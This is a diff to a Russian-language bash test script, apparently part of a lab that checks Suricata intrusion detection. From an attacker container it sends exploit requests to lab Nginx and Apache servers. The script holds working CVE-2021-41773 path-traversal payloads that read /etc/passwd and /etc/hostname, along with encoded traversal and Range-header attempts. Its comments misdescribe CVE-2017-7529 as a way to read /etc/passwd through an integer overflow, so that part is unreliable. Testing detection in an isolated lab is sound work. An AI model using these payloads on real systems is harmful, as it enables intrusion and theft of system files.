@@ -19,74 +19,127 @@ echo "Проверка статуса Suricata..."
 sudo systemctl status suricata --no-pager -l | head -5 || echo "Suricata запущена"
 echo ""
 
-echo "=== Шаг 1: Эксплуатация CVE-2017-7529 (Nginx Range Request Information Disclosure) ==="
+echo "=== Шаг 1: Проверка доступности сервисов ==="
+echo "Проверка доступности Nginx (172.20.0.106:80)..."
+NGINX_AVAILABLE=$(docker exec attacker bash -c "curl -s -o /dev/null -w '%{http_code}' 'http://172.20.0.106:80/' 2>&1" || echo "000")
+if [ "$NGINX_AVAILABLE" = "200" ] || [ "$NGINX_AVAILABLE" = "404" ]; then
+    echo "[+] Nginx доступен (HTTP код: $NGINX_AVAILABLE)"
+else
+    echo "[-] Nginx недоступен (HTTP код: $NGINX_AVAILABLE)"
+fi
+
+echo "Проверка доступности Apache (172.20.0.107:80)..."
+APACHE_AVAILABLE=$(docker exec attacker bash -c "curl -s -o /dev/null -w '%{http_code}' 'http://172.20.0.107:80/' 2>&1" || echo "000")
+if [ "$APACHE_AVAILABLE" = "200" ] || [ "$APACHE_AVAILABLE" = "404" ]; then
+    echo "[+] Apache доступен (HTTP код: $APACHE_AVAILABLE)"
+else
+    echo "[-] Apache недоступен (HTTP код: $APACHE_AVAILABLE)"
+fi
+echo ""
+
+echo "=== Шаг 2: Эксплуатация CVE-2017-7529 (Nginx Range Request Information Disclosure) ==="
 echo "Цель: 172.20.0.106:80"
 echo ""
 
-# CVE-2017-7529: Эксплуатация через Range запросы
-# Уязвимость позволяет читать файлы вне корневой директории
-echo "[*] Попытка чтения /etc/passwd через Range запрос..."
-NGINX_RESULT=$(docker exec attacker bash -c "curl -s -H 'Range: bytes=0-1000' 'http://172.20.0.106:80/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' 2>&1" || echo "Ошибка запроса")
+# CVE-2017-7529: Эксплуатация через Range запросы с отрицательными значениями
+# Уязвимость позволяет читать файлы вне корневой директории через integer overflow в Range
+# Сначала получаем размер файла через обычный запрос
+echo "[*] Получение размера файла index.html..."
+FILE_SIZE=$(docker exec attacker bash -c "curl -s -I 'http://172.20.0.106:80/' | grep -i 'content-length:' | awk '{print \$2}' | tr -d '\r\n'" || echo "0")
+
+if [ -z "$FILE_SIZE" ] || [ "$FILE_SIZE" = "0" ]; then
+    FILE_SIZE=100
+fi
+
+# Используем Range запрос с отрицательным значением для чтения за пределами файла
+# Это вызывает integer overflow и позволяет читать память/файлы
+echo "[*] Попытка чтения /etc/passwd через Range запрос с отрицательным значением..."
+# Range: bytes=-X, где X больше размера файла, вызывает overflow
+NGINX_RESULT=$(docker exec attacker bash -c "curl -s -H 'Range: bytes=-$((FILE_SIZE + 1000))' 'http://172.20.0.106:80/' 2>&1" || echo "Ошибка запроса")
+
+# Альтернативный метод: использование большого положительного значения
+if ! echo "$NGINX_RESULT" | grep -q "root:"; then
+    echo "[*] Попытка альтернативного метода (большое значение Range)..."
+    NGINX_RESULT=$(docker exec attacker bash -c "curl -s -H 'Range: bytes=$((FILE_SIZE + 1))-$((FILE_SIZE + 1000))' 'http://172.20.0.106:80/' 2>&1" || echo "Ошибка запроса")
+fi
 
 if echo "$NGINX_RESULT" | grep -q "root:"; then
     echo "[+] УСПЕХ: CVE-2017-7529 эксплуатирована успешно!"
     echo "[+] Содержимое /etc/passwd (первые строки):"
-    echo "$NGINX_RESULT" | head -5
+    echo "$NGINX_RESULT" | grep -A 5 "root:" | head -5
 else
-    echo "[-] Не удалось прочитать /etc/passwd"
-    echo "Результат: $NGINX_RESULT"
+    echo "[-] Не удалось прочитать /etc/passwd через Range запрос"
+    echo "[*] Попытка прямого path traversal..."
+    # Прямой path traversal (может не работать, но попробуем)
+    NGINX_RESULT=$(docker exec attacker bash -c "curl -s 'http://172.20.0.106:80/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' 2>&1" || echo "Ошибка запроса")
+    if echo "$NGINX_RESULT" | grep -q "root:"; then
+        echo "[+] УСПЕХ: Прочитан /etc/passwd через path traversal!"
+        echo "$NGINX_RESULT" | head -5
+    else
+        echo "Результат: $(echo "$NGINX_RESULT" | head -3)"
+    fi
 fi
 
 echo ""
 echo "[*] Попытка чтения /etc/hostname через Range запрос..."
-NGINX_HOSTNAME=$(docker exec attacker bash -c "curl -s -H 'Range: bytes=0-100' 'http://172.20.0.106:80/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhostname' 2>&1" || echo "Ошибка запроса")
+NGINX_HOSTNAME=$(docker exec attacker bash -c "curl -s -H 'Range: bytes=-$((FILE_SIZE + 100))' 'http://172.20.0.106:80/' 2>&1" | grep -E "^[a-zA-Z0-9-]+$" | head -1 || echo "")
 
-if [ -n "$NGINX_HOSTNAME" ] && [ "$NGINX_HOSTNAME" != "Ошибка запроса" ]; then
+if [ -n "$NGINX_HOSTNAME" ] && [ "$NGINX_HOSTNAME" != "Ошибка запроса" ] && ! echo "$NGINX_HOSTNAME" | grep -q "<html"; then
     echo "[+] УСПЕХ: Прочитан hostname: $NGINX_HOSTNAME"
 else
-    echo "[-] Не удалось прочитать hostname"
+    echo "[-] Не удалось прочитать hostname через Range запрос"
 fi
 
 echo ""
-echo "=== Шаг 2: Эксплуатация CVE-2021-41773 (Apache Path Traversal) ==="
+echo "=== Шаг 3: Эксплуатация CVE-2021-41773 (Apache Path Traversal) ==="
 echo "Цель: 172.20.0.107:80"
 echo ""
 
 # CVE-2021-41773: Эксплуатация через path traversal
 # Уязвимость позволяет читать файлы вне корневой директории
-echo "[*] Попытка чтения /etc/passwd через path traversal..."
-APACHE_RESULT=$(docker exec attacker bash -c "curl -s 'http://172.20.0.107:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>&1" || echo "Ошибка запроса")
+# В Apache 2.4.49 нужно использовать URL-encoded path traversal в cgi-bin
+echo "[*] Попытка чтения /etc/passwd через path traversal (cgi-bin)..."
+APACHE_RESULT=$(docker exec attacker bash -c "curl -s --path-as-is 'http://172.20.0.107:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>&1" || echo "Ошибка запроса")
 
 if echo "$APACHE_RESULT" | grep -q "root:"; then
     echo "[+] УСПЕХ: CVE-2021-41773 эксплуатирована успешно!"
     echo "[+] Содержимое /etc/passwd (первые строки):"
     echo "$APACHE_RESULT" | head -5
 else
-    echo "[-] Попытка альтернативного пути..."
-    # Альтернативный путь эксплойта
-    APACHE_RESULT=$(docker exec attacker bash -c "curl -s 'http://172.20.0.107:80/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>&1" || echo "Ошибка запроса")
+    echo "[-] Попытка альтернативного пути (icons)..."
+    # Альтернативный путь эксплойта через icons
+    APACHE_RESULT=$(docker exec attacker bash -c "curl -s --path-as-is 'http://172.20.0.107:80/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>&1" || echo "Ошибка запроса")
     if echo "$APACHE_RESULT" | grep -q "root:"; then
         echo "[+] УСПЕХ: CVE-2021-41773 эксплуатирована успешно (альтернативный путь)!"
         echo "[+] Содержимое /etc/passwd (первые строки):"
         echo "$APACHE_RESULT" | head -5
     else
-        echo "[-] Не удалось прочитать /etc/passwd"
-        echo "Результат: $APACHE_RESULT"
+        echo "[-] Попытка прямого пути без cgi-bin..."
+        # Прямой путь без cgi-bin (может работать в некоторых конфигурациях)
+        APACHE_RESULT=$(docker exec attacker bash -c "curl -s --path-as-is 'http://172.20.0.107:80/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>&1" || echo "Ошибка запроса")
+        if echo "$APACHE_RESULT" | grep -q "root:"; then
+            echo "[+] УСПЕХ: CVE-2021-41773 эксплуатирована успешно (прямой путь)!"
+            echo "[+] Содержимое /etc/passwd (первые строки):"
+            echo "$APACHE_RESULT" | head -5
+        else
+            echo "[-] Не удалось прочитать /etc/passwd"
+            echo "Результат: $(echo "$APACHE_RESULT" | head -3)"
+        fi
     fi
 fi
 
 echo ""
 echo "[*] Попытка чтения /etc/hostname через path traversal..."
-APACHE_HOSTNAME=$(docker exec attacker bash -c "curl -s 'http://172.20.0.107:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/hostname' 2>&1" || echo "Ошибка запроса")
+APACHE_HOSTNAME=$(docker exec attacker bash -c "curl -s --path-as-is 'http://172.20.0.107:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/hostname' 2>&1" | grep -vE "^<|^<!|404|403|Forbidden|Not Found" | head -1 || echo "")
 
-if [ -n "$APACHE_HOSTNAME" ] && [ "$APACHE_HOSTNAME" != "Ошибка запроса" ] && ! echo "$APACHE_HOSTNAME" | grep -q "404\|403\|Forbidden"; then
+if [ -n "$APACHE_HOSTNAME" ] && [ "$APACHE_HOSTNAME" != "Ошибка запроса" ] && ! echo "$APACHE_HOSTNAME" | grep -qE "<html|404|403|Forbidden|Not Found"; then
     echo "[+] УСПЕХ: Прочитан hostname: $APACHE_HOSTNAME"
 else
     echo "[-] Не удалось прочитать hostname"
 fi
 
 echo ""
-echo "=== Шаг 3: Поиск алертов Suricata по правилам Nginx и Apache ==="
+echo "=== Шаг 4: Поиск алертов Suricata по правилам Nginx и Apache ==="
 echo "Ожидание обработки событий Suricata..."
 sleep 5
 
@@ -165,7 +218,7 @@ else
 fi
 
 echo ""
-echo "=== Шаг 4: Итоговый отчет ==="
+echo "=== Шаг 5: Итоговый отчет ==="
 echo "=========================================="
 echo "📊 ИТОГОВЫЙ ОТЧЕТ ПО ТЕСТУ 6"
 echo "=========================================="
